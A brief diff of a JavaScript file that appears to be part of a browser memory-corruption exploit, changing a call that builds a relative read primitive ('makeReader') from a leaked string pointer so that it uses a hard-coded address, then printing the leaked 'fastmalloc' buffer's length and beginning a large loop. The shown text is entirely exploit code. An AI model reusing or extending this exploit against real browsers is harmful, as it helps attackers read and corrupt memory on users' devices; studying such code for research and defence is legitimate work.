@@ -197,7 +197,7 @@ function makeReader(read_addr, ffs_name)
     return relative_read;
 }
 
-var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr
+var fastmalloc = makeReader(0x205354f84, 'ffs3'); //read from leaked string ptr
 alert("fastmalloc.length = "+fastmalloc.length);
 
 for(var i = 0; i < 100000; i++)
